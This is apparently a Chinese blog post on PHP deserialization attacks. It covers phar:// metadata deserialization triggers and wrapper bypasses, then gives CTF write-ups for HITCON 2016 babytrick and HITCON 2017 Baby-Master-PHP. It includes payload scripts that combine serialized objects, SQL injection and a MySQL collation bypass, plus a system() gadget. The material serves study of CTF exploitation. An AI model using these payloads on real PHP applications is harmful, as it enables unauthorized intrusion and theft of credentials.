<p><a target="_blank" rel="noopener" href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">由 PHPGGC 理解 PHP 反序列化漏洞</a> 一文中对其概念概括十分简洁明了</p>
<blockquote>
<p>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> ，<code>php://</code>等类似，也是一种流包装器。</p>
</blockquote>
<blockquote>
<p>phar结构由 4 部分组成</p>
<ol>
<li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li>
<li><code>manifest</code> 压缩文件的属性等信息，以序列化存储；</li>
<li><code>contents</code> 压缩文件的内容；</li>
<li><code>signature</code> 签名，放在文件末尾；</li>
</ol>
</blockquote>
<blockquote>
<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
</blockquote>
<p>利用条件:</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<p>生成Phar</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>PS: 要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件</p>
</blockquote>
<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p>@secii 师傅文中提到: php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen</code></li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
</ul>
<p>随后 @zsx 师傅blog中 <a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 对其进行了更深入的挖掘</p>
<ul>
<li>exif<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
</li>
</ul>
<ul>
<li>gd<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
</ul>
</li>
</ul>
<ul>
<li>hash<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
</li>
</ul>
<ul>
<li>file / url<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
</ul>
</li>
</ul>
<ul>
<li>standard<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>zip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;open(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;extractTo(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>Bzip / Gzip<br>如果限制了<code>phar://</code>不能出现在头几个字符。可用 <code>compress.bzip2://</code> 和 <code>compress.zlib://</code> 添加至 <code>phar://</code> 前面进行 bypass<br><code>$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</code></p>
</li>
<li><p>MySQL<br><code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = mysqli_init();</span><br><span class="line">mysqli_options(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$s</span> = mysqli_real_connect(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;easyweb&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line"><span class="variable">$p</span> = mysqli_query(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/test\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="HITCON-递进反序列化"><a href="#HITCON-递进反序列化" class="headerlink" title="HITCON  递进反序列化"></a>HITCON  递进反序列化</h2><h3 id="HITCON-2016-babytrick"><a href="#HITCON-2016-babytrick" class="headerlink" title="HITCON 2016 babytrick"></a>HITCON 2016 babytrick</h3><p>网上没找到题目复现的docker环境，所以直接去 Github 上找的源码，对题目理解可能有失偏颇，敬请谅解。</p>
<p>题目代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>) = func_get_args();</span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die( sprintf(<span class="string">&quot;%s is %s&quot;</span>, <span class="variable">$obj</span>-&gt;username, <span class="variable">$obj</span>-&gt;role) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Nobody Nobody But You!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = func_get_args();</span><br><span class="line">        <span class="variable">$username</span> = strtolower(trim(mysql_escape_string(<span class="variable">$username</span>)));</span><br><span class="line">        <span class="variable">$password</span> = strtolower(trim(mysql_escape_string(<span class="variable">$password</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = sprintf(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$username</span> == <span class="string">&#x27;orange&#x27;</span> || stripos(<span class="variable">$sql</span>, <span class="string">&#x27;orange&#x27;</span>) != <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$obj</span>-&gt;role == <span class="string">&#x27;admin&#x27;</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Hi, Orange! Here is your flag: &quot;</span> . <span class="variable">$FLAG</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db_host</span>, <span class="variable">$db_name</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>, <span class="variable">$DEBUG</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>);</span><br><span class="line">        mysql_select_db(<span class="variable">$db_name</span>, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$DEBUG</span>) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users ( </span></span><br><span class="line"><span class="string">                        username VARCHAR(64), </span></span><br><span class="line"><span class="string">                        password VARCHAR(64), </span></span><br><span class="line"><span class="string">                        role VARCHAR(64)</span></span><br><span class="line"><span class="string">                    ) CHARACTER SET utf8&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        mysql_query(<span class="string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        mysql_query(<span class="string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = @mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$back</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line"></span><br><span class="line">        header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt; <span class="variable">$msg</span>) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;show&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;source&quot;</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = strtolower(trim(mysql_escape_string(<span class="variable">$v</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>])) &#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">&quot;source&quot;</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞代码核心: <code>@unserialize($_GET[&quot;data&quot;]);</code> </p>
<p>代码的全局过滤如下，主要过滤函数为 <code>mysql_escape_string</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __wakeup() &#123;</span><br><span class="line">    foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于此魔术方法的绕过为 <a target="_blank" rel="noopener" href="https://paper.seebug.org/866/">CVE-2016-7124</a></p>
<p>代码中参数附值主要靠 <code>call_user_func_array()</code>,<code>list()</code>,<code>func_get_args()</code>三个函数共同作用。</p>
<p>首先 <code>show</code> 方法中动态拼接sql语句采取了 <code>sprintf</code> 函数。但其对单引号等敏感字符并没有转义功能，又因为我们可利用CVE-2016-7124 来绕过全局过滤。因此此处存在sql注入。</p>
<p>通过sql注入获得orange密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>=<span class="string">&quot;show&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>=<span class="keyword">array</span>(<span class="string">&quot;&#x27; union select password,1,1 from users where username = &#x27;orange&#x27;#&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload1</span> = <span class="keyword">new</span> HITCON();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload1</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过上述步骤得知 <code>orange</code> 的密码是 <code>babytrick1234</code></p>
<p>接着进入 <code>login</code> 方法，这里通过用户名跟密码可以得到 flag。但其方法里一处限制如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="variable">$username</span> == <span class="string">&#x27;orange&#x27;</span> || stripos(<span class="variable">$sql</span>, <span class="string">&#x27;orange&#x27;</span>) != <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;__die(<span class="string">&quot;Orange is so shy. He do not want to see you.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Bypass的点为 mysql的编码设置安全</p>
<p>猪猪侠在微博上曾经说过</p>
<blockquote>
<p>MYSQL 中 <code>utf8_unicode_ci</code>和<code>utf8_general_ci</code>两种编码格式,<code>utf8_general_ci</code>不区分大小写,<code>Ä = A, Ö = O, Ü = U</code>这三种条件都成立,对于<code>utf8_general_ci</code>下面的等式成立：ß=s,但是，对于<code>utf8_unicode_ci</code>下面等式才成立：<code>ß = ss</code></p>
</blockquote>
<p>本地使用 DVWA 的库进行测试<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200311935.png"><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200319155.png" alt="image-20201113200319155"><br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200327296.png"></p>
<p>因此通过替换关键字符，构造最终payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$args</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;ORÄNGE&#x27;</span>;</span><br><span class="line"><span class="variable">$args</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;babytrick1234&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> HITCON(<span class="string">&#x27;login&#x27;</span>,<span class="variable">$args</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="HITCON-2017-Baby-Master-PHP"><a href="#HITCON-2017-Baby-Master-PHP" class="headerlink" title="HITCON 2017 Baby-Master-PHP"></a>HITCON 2017 Baby-Master-PHP</h3><p>题目采用 i春秋 平台进行复现。其实本来最开始复现采用的是buu，但是buu的平台加载不了我服务器上的phar文件。后来就换了</p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br><span class="line"><span class="variable">$SECRET</span> = `/read_secret`;</span><br><span class="line"><span class="variable">$SANDBOX</span> = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$SANDBOX</span>);</span><br><span class="line">@chdir(<span class="variable">$SANDBOX</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$SANDBOX</span>));</span><br><span class="line">    <span class="variable">$hmac</span> = hash_hmac(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;function my_function_<span class="subst">$random</span>() &#123;&quot;</span></span><br><span class="line">            . <span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span></span><br><span class="line">            . <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&quot;lucky&quot;</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = explode(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !is_string(<span class="variable">$data</span>) || !is_string(<span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;avatar)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">    show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;IP:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sandbox:&quot;</span>.<span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

